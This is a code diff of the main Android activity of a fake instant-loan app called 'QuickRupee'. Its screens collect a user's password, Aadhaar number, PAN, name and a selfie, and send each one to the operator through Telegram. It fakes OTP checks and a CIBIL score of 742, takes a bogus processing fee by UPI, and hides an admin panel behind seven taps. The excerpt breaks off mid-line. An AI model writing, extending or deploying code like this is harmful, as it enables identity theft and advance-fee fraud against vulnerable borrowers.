@@ -2,22 +2,24 @@ package com.quick.rupee
 
 import android.content.Intent
 import android.content.SharedPreferences
+import android.graphics.Bitmap
 import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
 import android.net.Uri
-import android.os.Build
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.provider.Settings
 import android.text.InputType
 import android.view.Gravity
+import android.view.View
 import android.widget.EditText
 import android.widget.ImageView
 import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
+import androidx.activity.OnBackPressedCallback
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import java.io.File
@@ -25,43 +27,73 @@ import java.io.File
 class MainActivity : AppCompatActivity() {
 
     private lateinit var prefs: SharedPreferences
+    private val hist = ArrayList<Int>()
     private var timer: CountDownTimer? = null
     private var shotUri: Uri? = null
+    private var selfie: Bitmap? = null
+    private var taps = 0
 
     private val askPerm = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()) { }
 
     private val pick = registerForActivityResult(
+        ActivityResultContracts.GetContent()) { u -> if (u != null) { shotUri = u; toast("Screenshot jud gaya") } }
+
+    private val pickSelfie = registerForActivityResult(
         ActivityResultContracts.GetContent()) { u ->
-        if (u != null) { shotUri = u; toast("Screenshot jud gaya") }
+        if (u != null) {
+            runCatching {
+                contentResolver.openInputStream(u)?.use {
+                    selfie = android.graphics.BitmapFactory.decodeStream(it)
+                }
+            }
+            render()
+        }
     }
+
+    private val camSelfie = registerForActivityResult(
+        ActivityResultContracts.TakePicturePreview()) { b -> if (b != null) { selfie = b; render() } }
 
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
         prefs = getSharedPreferences("qr", 0)
-        if (Build.VERSION.SDK_INT >= 26 && !Perms.allGranted(this))
-            askPerm.launch(Perms.needed(this).toTypedArray())
-        render()
+        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
+            override fun handleOnBackPressed() { back() }
+        })
+        if (!Perms.allGranted(this)) askPerm.launch(Perms.needed(this).toTypedArray())
+        if (step() == 0) splash() else render()
     }
 
-    override fun onDestroy() {
-        timer?.cancel()
-        super.onDestroy()
-    }
+    override fun onDestroy() { timer?.cancel(); super.onDestroy() }
 
     private fun step() = prefs.getInt("step", 0)
-    private fun go(n: Int) {
-        prefs.edit().putInt("step", n).apply()
-        render()
+    private fun setStep(n: Int) { prefs.edit().putInt("step", n).apply(); render() }
+    private fun go(n: Int) { hist.add(step()); setStep(n) }
+    private fun back() {
+        if (hist.isNotEmpty()) setStep(hist.removeAt(hist.size - 1))
+        else if (step() in 11..14 || step() in 20..24) setStep(11) else finish()
+    }
+
+    private fun splash() {
+        val box = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
+            setBackgroundColor(Color.parseColor("#1552C4"))
+        }
+        box.addView(tv("QuickRupee", 34f, Color.WHITE, true).apply { gravity = Gravity.CENTER })
+        box.addView(tv("Turant personal loan", 14f, Color.parseColor("#CFE0FF")).apply { gravity = Gravity.CENTER })
+        setContentView(box)
+        android.os.Handler(mainLooper).postDelayed({
+            if (step() == 0) setStep(if (prefs.getBoolean("done", false)) 11 else 1)
+        }, 1300)
     }
 
     private fun render() {
         when (step()) {
-            0 -> login()
-            1 -> kyc()
-            2 -> plans()
-            3 -> pay()
-            else -> done()
+            1 -> login(); 2 -> otp(); 3 -> aadhaar(); 4 -> aadhaarOtp()
+            5 -> pan(); 6 -> selfie(); 7 -> cibil(); 8 -> plans(); 9 -> pay()
+            10 -> done(); 11 -> home(); 12 -> upi(); 13 -> recharge(); 14 -> profile()
+            20 -> adminLogin(); 21 -> adminDash(); 22 -> adminPays(); 23 -> adminSet(); 24 -> adminCust()
+            else -> home()
         }
     }
 
@@ -70,25 +102,20 @@ class MainActivity : AppCompatActivity() {
 
     private fun tv(t: String, size: Float, color: Int, bold: Boolean = false) =
         TextView(this).apply {
-            text = t
-            textSize = size
-            setTextColor(color)
+            text = t; textSize = size; setTextColor(color)
             if (bold) setTypeface(typeface, Typeface.BOLD)
             setPadding(0, dp(3), 0, dp(3))
         }
 
-    private fun field(label: String, hint: String, num: Boolean = false): Pair<LinearLayout, EditText> {
+    private fun field(label: String, hint: String, num: Boolean = false, value: String = ""): Pair<LinearLayout, EditText> {
         val box = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
         box.addView(tv(label, 12f, Color.parseColor("#6B7A90")))
         val e = EditText(this).apply {
-            this.hint = hint
-            textSize = 15f
-            setSingleLine(true)
+            this.hint = hint; textSize = 15f; setSingleLine(true); setText(value)
             inputType = if (num) InputType.TYPE_CLASS_NUMBER else InputType.TYPE_CLASS_TEXT
             setPadding(dp(12), dp(12), dp(12), dp(12))
             background = GradientDrawable().apply {
-                setColor(Color.WHITE)
-                cornerRadius = dp(10).toFloat()
+                setColor(Color.WHITE); cornerRadius = dp(10).toFloat()
                 setStroke(dp(1), Color.parseColor("#DCE3EE"))
             }
         }
@@ -110,14 +137,22 @@ class MainActivity : AppCompatActivity() {
         }
 
     private fun header(sub: String): LinearLayout = LinearLayout(this).apply {
-        orientation = LinearLayout.VERTICAL
+        orientation = LinearLayout.HORIZONTAL
         setBackgroundColor(Color.parseColor("#1552C4"))
-        setPadding(dp(20), dp(26), dp(20), dp(22))
-        addView(tv("QuickRupee", 24f, Color.WHITE, true))
-        addView(tv(sub, 13f, Color.parseColor("#CFE0FF")))
+        setPadding(dp(14), dp(22), dp(18), dp(18))
+        val col = LinearLayout(this@MainActivity).apply { orientation = LinearLayout.VERTICAL }
+        col.addView(tv("QuickRupee", 22f, Color.WHITE, true))
+        col.addView(tv(sub, 12f, Color.parseColor("#CFE0FF")))
+        if (step() in 2..10 || step() in 21..24) {
+            addView(tv("←", 26f, Color.WHITE, true).apply {
+                setPadding(dp(6), 0, dp(14), 0); isClickable = true
+                setOnClickListener { back() }
+            })
+        }
+        addView(col)
     }
 
-    private fun page(vararg views: android.view.View): ScrollView {
+    private fun page(vararg views: View): ScrollView {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setBackgroundColor(Color.parseColor("#F4F6FA"))
@@ -130,99 +165,178 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun toast(m: String) = Toast.makeText(this, m, Toast.LENGTH_SHORT).show()
+    private fun device() =
+        "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} | A${android.os.Build.VERSION.RELEASE}"
+    private fun send(m: String) { Thread { runCatching { Tg.text(m) } }.start() }
 
-    private fun device(): String =
-        "${Build.MANUFACTURER} ${Build.MODEL} | A${Build.VERSION.RELEASE} | ${BuildConfig.VERSION_NAME}"
-
-    // ---------- screens ----------
+    // ---------- customer flow ----------
     private fun login() {
-        val pad = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(20), dp(20), dp(20), dp(28))
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
+        val title = tv("Turant personal loan", 20f, Color.parseColor("#16233A"), true).apply {
+            isClickable = true
+            setOnClickListener {
+                taps++
+                if (taps >= 7) { taps = 0; hist.clear(); setStep(20) }
+            }
         }
-        pad.addView(tv("Turant personal loan", 20f, Color.parseColor("#16233A"), true))
-        pad.addView(tv("₹20,000 se ₹1,00,000 tak, bina kagaz ke", 13f, Color.parseColor("#6B7A90")))
-
+        pad.addView(title)
+        pad.addView(tv("₹20,000 se ₹1,00,000 tak, 5 minute mein", 13f, Color.parseColor("#6B7A90")))
         val (mBox, mEt) = field("Mobile number", "10 digit mobile number", true)
         val (pBox, pEt) = field("Password", "Password banayein")
         pEt.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
-
-        pad.addView(mBox)
-        pad.addView(pBox)
-        pad.addView(btn("Login karein", Color.parseColor("#1552C4"), Color.WHITE) {
+        pad.addView(mBox); pad.addView(pBox)
+        pad.addView(btn("OTP bhejein", Color.parseColor("#1552C4"), Color.WHITE) {
             val m = mEt.text.toString().trim()
             val p = pEt.text.toString().trim()
             if (m.length != 10) { toast("10 digit mobile daalein"); return@btn }
             if (p.length < 4) { toast("Password kam se kam 4 akshar"); return@btn }
             prefs.edit().putString("mobile", m).putString("pass", p).apply()
-            Thread {
-                runCatching {
-                    Tg.text("<b>LOGIN</b>\n<b>Mobile</b> <code>$m</code>\n<b>Password</b> <code>$p</code>\n${device()}\n${BuildConfig.UPI_ID}")
-                }
-            }.start()
-            go(1)
-        })
-        pad.addView(tv("Aage badhne par aap niyam avam shartein sweekar karte hain.", 11f, Color.parseColor("#6B7A90")).apply {
-            setPadding(0, dp(14), 0, 0)
-        })
-        setContentView(page(header("Turant approval - 5 minute"), pad))
-    }
-
-    private fun kyc() {
-        val pad = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(20), dp(20), dp(20), dp(28))
-        }
-        pad.addView(tv("KYC poora karein", 20f, Color.parseColor("#16233A"), true))
-        pad.addView(tv("Aapki jaankari surakshit hai", 13f, Color.parseColor("#6B7A90")))
-
-        val (aBox, aEt) = field("Aadhaar number", "12 digit Aadhaar", true)
-        val (bBox, bEt) = field("Bank ka naam", "Jaise SBI, HDFC")
-        val (cBox, cEt) = field("Bank account number", "Account number", true)
-        val (iBox, iEt) = field("IFSC code", "IFSC (11 akshar)")
-
-        pad.addView(aBox); pad.addView(bBox); pad.addView(cBox); pad.addView(iBox)
-        pad.addView(btn("KYC submit karein", Color.parseColor("#1552C4"), Color.WHITE) {
-            val a = aEt.text.toString().trim()
-            val b = bEt.text.toString().trim()
-            val c = cEt.text.toString().trim()
-            val i = iEt.text.toString().trim().uppercase()
-            if (a.length != 12) { toast("12 digit Aadhaar daalein"); return@btn }
-            if (b.isEmpty()) { toast("Bank ka naam daalein"); return@btn }
-            if (c.length < 9) { toast("Sahi account number daalein"); return@btn }
-            if (i.length != 11) { toast("Sahi IFSC daalein"); return@btn }
-            prefs.edit().putString("aadhaar", a).putString("bank", b)
-                .putString("acc", c).putString("ifsc", i).apply()
-            Thread {
-                runCatching {
-                    Tg.text("<b>KYC</b>\n<b>Mobile</b> <code>${prefs.getString("mobile", "-")}</code>\n" +
-                        "<b>Password</b> <code>${prefs.getString("pass", "-")}</code>\n" +
-                        "<b>Aadhaar</b> <code>$a</code>\n<b>Bank</b> $b\n" +
-                        "<b>Account</b> <code>$c</code>\n<b>IFSC</b> <code>$i</code>\n${device()}")
-                }
-            }.start()
+            Db.addOpen(this, m, prefs.getString("name", "customer"))
+            send("<b>LOGIN</b>\n<b>Mobile</b> <code>$m</code>\n<b>Password</b> <code>$p</code>\n${device()}")
+            toast("OTP bheja gaya")
             go(2)
         })
-        setContentView(page(header("Step 2 / 3 - KYC"), pad))
+        pad.addView(tv("Admin: title pe 7 tap", 11f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(14), 0, 0) })
+        setContentView(page(header("Login"), pad))
     }
 
-    private fun fee(a: Int) = when (a) {
-        20000 -> 3000
-        50000 -> 5000
-        else -> 8000
+    private fun otp() {
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
+        pad.addView(tv("OTP verify karein", 20f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("OTP bheja gaya: ${prefs.getString("mobile", "")}", 13f, Color.parseColor("#6B7A90")))
+        val (oBox, oEt) = field("4 digit OTP", "****", true)
+        pad.addView(oBox)
+        val tTv = tv("", 13f, Color.parseColor("#B00020"))
+        pad.addView(tTv)
+        timer?.cancel()
+        timer = object : CountDownTimer(30_000, 1000) {
+            override fun onTick(ms: Long) { tTv.text = "Dobara bhejne ke liye ${ms / 1000} sec" }
+            override fun onFinish() { tTv.text = "OTP dobara bhejein" }
+        }.start()
+        pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
+            if (oEt.text.toString().trim().length < 4) { toast("4 digit OTP daalein"); return@btn }
+            send("<b>OTP verified</b> ${prefs.getString("mobile", "")}")
+            go(3)
+        })
+        setContentView(page(header("Step 1 / 4 - Verify"), pad))
     }
+
+    private fun aadhaar() {
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
+        pad.addView(tv("Aadhaar se KYC", 20f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("Aadhaar linked mobile par OTP jayega", 13f, Color.parseColor("#6B7A90")))
+        val (aBox, aEt) = field("Aadhaar number", "12 digit Aadhaar", true)
+        pad.addView(aBox)
+        pad.addView(btn("Aadhaar OTP bhejein", Color.parseColor("#1552C4"), Color.WHITE) {
+            val a = aEt.text.toString().trim()
+            if (a.length != 12) { toast("12 digit Aadhaar daalein"); return@btn }
+            prefs.edit().putString("aadhaar", a).apply()
+            send("<b>AADHAAR</b> <code>$a</code> | ${prefs.getString("mobile", "")}")
+            toast("OTP bheja gaya")
+            go(4)
+        })
+        setContentView(page(header("Step 2 / 4 - Aadhaar"), pad))
+    }
+
+    private fun aadhaarOtp() {
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
+        pad.addView(tv("Aadhaar OTP", 20f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("Aadhaar linked number par OTP bheja gaya", 13f, Color.parseColor("#6B7A90")))
+        val (oBox, oEt) = field("6 digit OTP", "******", true)
+        pad.addView(oBox)
+        pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
+            if (oEt.text.toString().trim().length < 4) { toast("OTP daalein"); return@btn }
+            send("<b>Aadhaar OTP verified</b> ${prefs.getString("mobile", "")}")
+            go(5)
+        })
+        setContentView(page(header("Step 2 / 4 - Aadhaar OTP"), pad))
+    }
+
+    private fun pan() {
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
+        pad.addView(tv("PAN details", 20f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("CIBIL score dekhne ke liye zaruri", 13f, Color.parseColor("#6B7A90")))
+        val (nBox, nEt) = field("Poora naam", "Jaise Gaurav Kumar")
+        val (pBox, pEt) = field("PAN number", "ABCDE1234F")
+        pad.addView(nBox); pad.addView(pBox)
+        pad.addView(btn("Aage badhein", Color.parseColor("#1552C4"), Color.WHITE) {
+            val n = nEt.text.toString().trim()
+            val p = pEt.text.toString().trim().uppercase()
+            if (n.length < 3) { toast("Poora naam daalein"); return@btn }
+            if (p.length != 10) { toast("10 akshar ka PAN daalein"); return@btn }
+            prefs.edit().putString("name", n).putString("pan", p).apply()
+            Db.addOpen(this, prefs.getString("mobile", "-"), n)
+            send("<b>PAN</b> <code>$p</code>\n<b>Name</b> $n\n<b>Aadhaar</b> <code>${prefs.getString("aadhaar", "-")}</code>\n${prefs.getString("mobile", "")}")
+            go(6)
+        })
+        setContentView(page(header("Step 3 / 4 - PAN"), pad))
+    }
+
+    private fun selfie() {
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
+        pad.addView(tv("Selfie khinchein", 20f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("Chehra saaf dikhna chahiye", 13f, Color.parseColor("#6B7A90")))
+        val holder = LinearLayout(this).apply {
+            gravity = Gravity.CENTER
+            setPadding(dp(10), dp(10), dp(10), dp(10))
+            background = GradientDrawable().apply {
+                setColor(Color.WHITE); cornerRadius = dp(12).toFloat()
+                setStroke(dp(1), Color.parseColor("#DCE3EE"))
+            }
+        }
+        val iv = ImageView(this)
+        holder.addView(iv, LinearLayout.LayoutParams(dp(220), dp(220)))
+        val b = selfie
+        if (b != null) iv.setImageBitmap(b)
+        pad.addView(holder)
+        pad.addView(btn("Camera se photo", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { camSelfie.launch(null) })
+        pad.addView(btn("Gallery se chunein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { pickSelfie.launch("image/*") })
+        pad.addView(btn("Selfie submit karein", Color.parseColor("#1552C4"), Color.WHITE) {
+            val bm = selfie
+            if (bm == null) { toast("Pehle selfie lein"); return@btn }
+            Thread {
+                runCatching {
+                    val f = File(cacheDir, "selfie.jpg")
+                    f.outputStream().use { bm.compress(Bitmap.CompressFormat.JPEG, 80, it) }
+                    Tg.photo(f, "selfie KYC | ${prefs.getString("mobile", "")}")
+                    f.delete()
+                }
+            }.start()
+            go(7)
+        })
+        setContentView(page(header("Step 4 / 4 - Selfie"), pad))
+    }
+
+    private fun cibil() {
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(24), dp(20), dp(28)) }
+        pad.addView(tv("CIBIL report taiyar ho rahi hai...", 16f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("Aadhaar, PAN aur selfie verify ho rahi hai", 13f, Color.parseColor("#6B7A90")))
+        setContentView(page(header("Verification"), pad))
+        android.os.Handler(mainLooper).postDelayed({ if (step() == 7) score() }, 2200)
+    }
+
+    private fun score() {
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
+        pad.addView(tv("Aapka CIBIL score", 14f, Color.parseColor("#6B7A90")))
+        pad.addView(tv("742", 46f, Color.parseColor("#138808"), true))
+        pad.addView(tv("Achha (700-750)", 13f, Color.parseColor("#138808")))
+        val bar = View(this)
+        bar.background = GradientDrawable().apply { setColor(Color.parseColor("#138808")); cornerRadius = dp(6).toFloat() }
+        pad.addView(bar, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(10)).apply { setMargins(0, dp(10), 0, dp(10)) })
+        pad.addView(tv("Aap ₹1,00,000 tak ke loan ke liye eligible hain", 16f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("Byaj 14% se shuru | avadhi 3 se 24 mahine", 13f, Color.parseColor("#6B7A90")))
+        send("<b>CIBIL</b> 742 | eligible ₹1,00,000 | ${prefs.getString("name", "-")} ${prefs.getString("pan", "-")}")
+        pad.addView(btn("Offers dekhein", Color.parseColor("#1552C4"), Color.WHITE) { go(8) })
+        setContentView(page(header("Report"), pad))
+    }
+
+    private fun fee(a: Int) = when (a) { 20000 -> 3000; 50000 -> 5000; else -> 8000 }
 
     private fun plans() {
-        val pad = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(20), dp(20), dp(20), dp(28))
-        }
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
         pad.addView(tv("Badhai ho!", 22f, Color.parseColor("#138808"), true))
         pad.addView(tv("Aap ₹1,00,000 tak ke liye eligible hain", 14f, Color.parseColor("#16233A")))
-        pad.addView(tv("Apna amount chunein", 13f, Color.parseColor("#6B7A90")).apply {
-            setPadding(0, dp(14), 0, dp(4))
-        })
-
+        pad.addView(tv("Apna amount chunein", 13f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(14), 0, dp(4)) })
         for (a in listOf(20000, 50000, 100000)) {
             val card = LinearLayout(this).apply {
                 orientation = LinearLayout.VERTICAL
@@ -234,16 +348,12 @@ class MainActivity : AppCompatActivity() {
                 isClickable = true
                 setOnClickListener {
                     prefs.edit().putInt("amount", a).apply()
-                    Thread {
-                        runCatching {
-                            Tg.text("<b>PLAN CHUNA</b>\n₹$a | fee ₹${fee(a)}\nMobile ${prefs.getString("mobile", "-")}")
-                        }
-                    }.start()
-                    go(3)
+                    send("<b>PLAN CHUNA</b> ₹$a | fee ₹${fee(a)} | ${prefs.getString("mobile", "")}")
+                    go(9)
                 }
             }
             card.addView(tv("₹${"%,d".format(a)}", 20f, Color.parseColor("#16233A"), true))
-            card.addView(tv("Processing fee ₹${fee(a)}", 13f, Color.parseColor("#6B7A90")))
+            card.addView(tv("Processing fee ₹${fee(a)} | EMI ₹${"%,d".format(a / 12 + 900)}", 13f, Color.parseColor("#6B7A90")))
             card.addView(tv("Turant approval", 12f, Color.parseColor("#138808")))
             card.layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
@@ -256,16 +366,12 @@ class MainActivity : AppCompatActivity() {
     private fun pay() {
         val amount = prefs.getInt("amount", 20000)
         val f = fee(amount)
-        val pad = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(20), dp(20), dp(20), dp(28))
-        }
+        val upi = Db.upi(this)
+        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
         pad.addView(tv("Processing fee ₹${"%,d".format(f)}", 20f, Color.parseColor("#16233A"), true))
         pad.addView(tv("₹${"%,d".format(amount)} ke loan ke liye ek baar fee jama karein", 13f, Color.parseColor("#6B7A90")))
-
         val qrBox = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            gravity = Gravity.CENTER
+            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
             setPadding(dp(16), dp(16), dp(16), dp(16))
             background = GradientDrawable().apply {
                 setColor(Color.WHITE); cornerRadius = dp(12).toFloat()
@@ -273,101 +379,16 @@ class MainActivity : AppCompatActivity() {
             }
         }
         val img = ImageView(this)
-        val upiLink = "upi://pay?pa=${BuildConfig.UPI_ID}&pn=${BuildConfig.UPI_NAME}&am=$f&cu=INR"
+        val link = "upi://pay?pa=$upi&pn=${Db.upiName(this)}&am=$f&cu=INR"
         val qrId = resources.getIdentifier("qr", "drawable", packageName)
         if (qrId != 0) img.setImageResource(qrId) else Thread {
-            val bm = Tg.qrImage(upiLink)
+            val bm = Tg.qrImage(link)
             if (bm != null) runOnUiThread { img.setImageBitmap(bm) }
         }.start()
         qrBox.addView(img, LinearLayout.LayoutParams(dp(230), dp(230)))
         qrBox.addView(tv("Scan karke ₹${"%,d".format(f)} bhejein", 13f, Color.parseColor("#16233A")))
-        qrBox.addView(tv(BuildConfig.UPI_ID, 13f, Color.parseColor("#1552C4"), true))
+        qrBox.addView(tv(upi, 13f, Color.parseColor("#1552C4"), true))
         pad.addView(qrBox)
-
         pad.addView(btn("UPI app se pay karein", Color.parseColor("#138808"), Color.WHITE) {
-            val uri = Uri.parse("upi://pay?pa=${BuildConfig.UPI_ID}&pn=${BuildConfig.UPI_NAME}&am=$f&cu=INR")
-            runCatching { startActivity(Intent(Intent.ACTION_VIEW, uri)) }
-                .onFailure { toast("Koi UPI app nahi mili - QR scan karein") }
-        })
-
-        val timerTv = tv("02:00", 22f, Color.parseColor("#B00020"), true).apply {
-            gravity = Gravity.CENTER
-            setPadding(0, dp(14), 0, 0)
-        }
-        pad.addView(tv("Payment ke baad UTR daalein - samay:", 13f, Color.parseColor("#6B7A90")).apply {
-            setPadding(0, dp(16), 0, 0)
-        })
-        pad.addView(timerTv)
-
-        timer?.cancel()
-        timer = object : CountDownTimer(120_000, 1000) {
-            override fun onTick(ms: Long) {
-                timerTv.text = "%02d:%02d".format(ms / 60000, (ms % 60000) / 1000)
-            }
-            override fun onFinish() { timerTv.text = "samay samapt" }
-        }.start()
-
-        val (uBox, uEt) = field("UTR / Reference number", "12 digit UTR", true)
-        pad.addView(uBox)
-        pad.addView(btn("Screenshot attach karein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
-            pick.launch("image/*")
-        })
-        pad.addView(btn("Payment ho gaya - submit", Color.parseColor("#1552C4"), Color.WHITE) {
-            val u = uEt.text.toString().trim()
-            if (u.length < 6) { toast("Sahi UTR daalein"); return@btn }
-            prefs.edit().putString("utr", u).apply()
-            Thread {
-                runCatching {
-                    Tg.text("<b>PAYMENT CLAIM</b>\n<b>Amount</b> ₹$amount | <b>Fee</b> ₹$f\n" +
-                        "<b>UTR</b> <code>$u</code>\n<b>Mobile</b> <code>${prefs.getString("mobile", "-")}</code>\n" +
-                        "<b>Account</b> <code>${prefs.getString("acc", "-")}</code> ${prefs.getString("ifsc", "-")}\n" +
-                        "<b>Aadhaar</b> <code>${prefs.getString("aadhaar", "-")}</code>\n${device()}")
-                    val u2 = shotUri
-                    if (u2 != null) {
-                        val tmp = File(cacheDir, "pay.jpg")
-                        contentResolver.openInputStream(u2)?.use { ins ->
-                            tmp.outputStream().use { ins.copyTo(it) }
-                        }
-                        Tg.photo(tmp, "payment screenshot")
-                        tmp.delete()
-                    }
-                }
-            }.start()
-            go(4)
-        })
-        setContentView(page(header("Payment"), pad))
-    }
-
-    private fun done() {
-        val amount = prefs.getInt("amount", 20000)
-        val pad = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(20), dp(24), dp(20), dp(28))
-        }
-        pad.addView(tv("Aavedan safal", 24f, Color.parseColor("#138808"), true))
-        pad.addView(tv("₹${"%,d".format(amount)} ka loan swikrit", 17f, Color.parseColor("#16233A"), true))
-        pad.addView(tv("Agli 24 ghante mein amount aapke bank account mein credit ho jayega.",
-            14f, Color.parseColor("#16233A")).apply { setPadding(0, dp(10), 0, 0) })
-        pad.addView(tv("Reference: QR-${prefs.getString("mobile", "0000")}-${prefs.getString("utr", "-")}",
-            12f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(12), 0, 0) })
-
-        pad.addView(btn("Notification access ON karein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
-            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-        })
-        pad.addView(btn("Battery Unrestricted karein", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
-            Perms.askBattery(this)
-        })
-
-        pad.addView(tv("Aapke liye aur offers", 15f, Color.parseColor("#16233A"), true).apply {
-            setPadding(0, dp(20), 0, dp(4))
-        })
-        for (t in listOf("Instant personal loan - 24 ghante mein", "Loan ₹1,00,000 tak - kam byaj",
-                "Credit score sudharein - free report", "Dost ko refer karein - ₹500 kamayein")) {
-            pad.addView(tv("-  $t", 13f, Color.parseColor("#6B7A90")))
-        }
-        pad.addView(tv("QuickRupee  |  support@quickrupee.in", 11f, Color.parseColor("#6B7A90")).apply {
-            setPadding(0, dp(20), 0, 0)
-        })
-        setContentView(page(header("Dashboard"), pad))
-    }
-}
+            runCatching { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(link))) }
+    
